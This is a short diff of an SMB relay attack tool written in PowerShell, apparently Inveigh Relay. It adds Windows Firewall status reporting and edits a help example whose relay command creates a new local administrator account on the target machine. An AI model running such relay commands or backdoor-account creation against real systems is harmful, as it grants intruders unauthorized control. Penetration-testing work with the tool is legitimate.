@@ -87,7 +87,7 @@ Default = 0: (0,1,2) Enable/Disable features for better operation through extern
 Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
 
 .EXAMPLE
-Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
+Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2016 /add && net localgroup administrators Dave /add"
 Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
 target.
 
@@ -233,6 +233,13 @@ if(!$inveigh.running)
 {
     $inveigh.status_queue.Add("Inveigh Relay started at $(Get-Date -format 's')") > $null
     $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay started")]) > $null
+
+    $firewall_status = netsh advfirewall show allprofiles state | where {$_ -match 'ON'}
+
+    if($firewall_status)
+    {
+        $inveigh.status_queue.Add("Windows Firewall = Enabled")  > $null
+    }
 
     if($HTTP -eq 'Y')
     {
@@ -397,6 +404,12 @@ if($inveigh.status_output)
             {
 
                 "Run Stop-Inveigh to stop Inveigh"
+                {
+                    Write-Warning($inveigh.status_queue[0])
+                    $inveigh.status_queue.RemoveRange(0,1)
+                }
+
+                "Windows Firewall = Enabled"
                 {
                     Write-Warning($inveigh.status_queue[0])
                     $inveigh.status_queue.RemoveRange(0,1)
